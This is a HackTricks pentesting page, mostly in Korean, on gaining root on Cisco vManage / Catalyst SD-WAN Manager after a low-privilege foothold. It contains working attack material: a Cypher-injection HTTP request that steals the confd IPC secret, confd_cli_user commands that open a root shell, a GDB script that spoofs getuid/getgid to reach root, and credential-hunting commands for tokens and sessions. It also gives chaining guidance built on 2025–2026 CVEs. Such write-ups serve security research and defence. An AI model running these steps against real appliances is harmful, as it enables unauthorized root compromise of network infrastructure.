# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Cisco vManage / *Catalyst SD-WAN Manager*에서 `vmanage`, `netadmin` 또는 `vmanage-admin`으로 code execution을 얻으면, 가장 흥미로운 local privesc surface는 보통 `confd` CLI stack, `cmdptywrapper` helper, localhost REST APIs, 그리고 root-owned import/upload handlers입니다.

컨트롤러에서 **initial foothold**가 아직 필요하다면, 먼저 전용 control-plane 페이지를 확인하세요:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Quick local triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
```
`/etc/confd/confd_ipc_secret`를 foothold에서 읽을 수 있다면, Path 1과 Path 2는 즉시 실용적이 됩니다.

## Path 1

(Example from [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

`confd`와 여러 binary에 관한 일부 [documentation](http://66.218.245.39/doc/html/rn03re18.html)을 조금 더 살펴본 뒤(Cisco website의 account로 접근 가능), IPC socket을 인증하기 위해 `/etc/confd/confd_ipc_secret`에 있는 secret을 사용한다는 것을 확인했습니다:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Remember our Neo4j instance? It is running under the `vmanage` user's privileges, thus allowing us to retrieve the file using the previous vulnerability:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` 프로그램은 command line arguments를 지원하지 않지만 `/usr/bin/confd_cli_user`를 arguments와 함께 호출합니다. 따라서 `/usr/bin/confd_cli_user`를 우리 own set of arguments로 직접 호출할 수 있습니다. However it is not readable with our current privileges, so we have to retrieve it from the rootfs and copy it using scp, read the help, and use it to get the shell:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Path 2

(Example from [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

synacktiv 팀의 blog¹는 root shell을 얻는 우아한 방법을 설명했지만, caveat은 `/usr/bin/confd_cli_user`의 복사본이 필요하다는 점이며, 이 파일은 root만 읽을 수 있다. 나는 이런 번거로움 없이 root로 escalte할 수 있는 다른 방법을 찾았다.

`/usr/bin/confd_cli` binary를 disassemble했을 때, 다음을 관찰했다:

<details>
<summary>UID/GID collection을 보여주는 Objdump</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

“ps aux”를 실행했을 때, 다음을 관찰했다 (_note -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
I hypothesized the “confd_cli” 프로그램이 logged in user로부터 수집한 user ID와 group ID를 “cmdptywrapper” 애플리케이션에 전달한다는 점입니다.

첫 시도는 “cmdptywrapper”를 직접 실행하면서 `-g 0 -u 0`을 주는 것이었지만 실패했습니다. 아마도 파일 디스크립터(-i 1015)가 그 과정 어딘가에서 생성되었고, 저는 그것을 fake할 수 없었습니다.

synacktiv의 blog(마지막 예시)에서 언급했듯이, “confd_cli” 프로그램은 command line argument를 지원하지 않지만, debugger로는 영향을 줄 수 있고 다행히도 시스템에 GDB가 포함되어 있습니다.

저는 `getuid`와 `getgid` API가 0을 반환하도록 강제하는 GDB script를 만들었습니다. 이미 deserialization RCE를 통해 “vmanage” privilege를 가지고 있으므로, `/etc/confd/confd_ipc_secret`을 직접 읽을 권한이 있습니다.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
<details>
<summary>콘솔 출력</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## 경로 3 (2025 CLI input validation bug - CVE-2025-20122)

Cisco는 나중에 자체 advisory에서 [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt)에 대한 더 깔끔한 local root 경로를 문서화했다: **read-only privileges만 가진 authenticated attacker**가 manager CLI로 crafted request를 보내고, insufficient input validation 때문에 root로 jump할 수 있었다.

offensive 관점에서, 이것이 중요한 takeaway다:

1. 박스에서 *어떤* low-priv foothold라도 얻었다면, 더 무거운 Path 1 / Path 2 workflow로 가기 전에 local CLI service를 테스트해야 한다.
2. Path 2의 artifact를 재사용해 trust boundary를 찾아라: `confd_cli` → `cmdptywrapper` → `vshell`.
3. CLI backend로 전달되는 모든 필드를 의심하라: UID/GID, username, terminal metadata, imported files, 또는 나중에 root-owned helper가 소비하는 모든 값.
4. low-priv user가 local CLI socket에 도달해 저 필드들에 영향을 줄 수 있다면, root는 crafted request 하나만 남아 있을 수 있다.

어플라이언스에 접속한 뒤의 practical workflow는 다음과 같다:
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
이렇게 하면 2025 버그가 비슷한 버전들을 위한 좋은 헌팅 패턴이 됩니다: **userland에서 identity를 수집하고 더 높은 권한의 wrapper로 전달하는 local CLI shims**를 찾아보세요.

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

Cisco의 2026년 2월 advisory는 또 다른 유용한 privesc 클래스를 소개했습니다: [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)는 **인증된, low privileges를 가진 local attacker**가 REST API의 불충분한 user-authentication mechanism 때문에 root 권한을 얻을 수 있게 했습니다.

이 점이 중요한 이유는 vManage privesc가 더 이상 `confd`/TTY abuse에만 국한되지 않기 때문입니다. low-priv shell을 얻은 뒤에는 다음도 함께 hunt하세요:

- caller를 너무 많이 trust하는 localhost-only API endpoints
- 현재 account에서 읽을 수 있는 tokens, cookies, 또는 service credentials
- `dataservice`/REST handlers를 통해 노출되지만 여전히 locally trigger 가능한 root-only actions

실제로 `vmanage` 또는 다른 service user로 shell을 얻으면, local API abuse는 interactive CLI abuse보다 더 조용하고 자동화하기도 쉽습니다:
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
로컬 session context가 privileged REST functionality를 hit하기에 충분하다면, API path를 선호하라: 훨씬 쉽게 replay, script, 그리고 stolen web sessions나 API tokens와 chain할 수 있다.

## Path 5 (2026 crafted file processed by root - CVE-2026-20245)

또 다른 최근 패턴은 [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)이다: `netadmin` privileges를 가진 local attacker가 **crafted file**을 upload할 수 있었고, CLI가 나중에 이를 unsafe하게 처리하여 `root`로 command injection이 발생했다.

HackTricks 관점에서, 가치 있는 technique는 특정 CVE보다 더 넓다:

1. file을 accept하는 모든 CLI 또는 web workflow를 enumerate하라: imports, diagnostic bundles, templates, validators, backups, tenant data, 등.
2. uploaded file이 어디에 landing하는지, 그리고 어떤 root-owned script 또는 binary가 이를 consume하는지 trace하라.
3. filename, file content, 또는 parsed metadata가 shell commands, wrapper scripts, 또는 `system()`-style helpers로 전달되는지 test하라.
4. 이미 `netadmin`에 reach할 수 있다면(valid creds, stolen session, 또는 auth-bypass chain), file-processing bugs가 종종 root로 가는 가장 빠른 경로다.

이 bug class는 `netadmin`은 주지만 `root`는 주지 않는 remote footholds와 특히 잘 chain된다.

## Other recent vManage/Catalyst SD-WAN Manager vulns to chain

- **Authenticated UI XSS (CVE-2024-20475)** – web UI에서 admin session을 훔친 뒤, 결국 `vshell` 또는 위의 local privesc paths 중 하나에 도달하는 API/CLI actions로 pivot하라.
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – 2026 crafted-file privesc가 정확히 요구하는 수준이 `netadmin`이므로 Path 5의 매우 강력한 precursor다.
- **Authenticated arbitrary file write (CVE-2026-20262)** – 나중에 privileged components가 parse하는 files를 drop하거나, root-owned helpers가 consume하는 operational artifacts를 overwrite하는 데 유용하다.
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – 전용 SD-WAN control-plane page에서 더 잘 문서화되어 있다; `vmanage-admin`용 SSH key를 append할 수 있어, 이 page를 다시 볼 수 있는 local foothold를 제공한다.

## References

- [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)

{{#include ../../banners/hacktricks-training.md}}
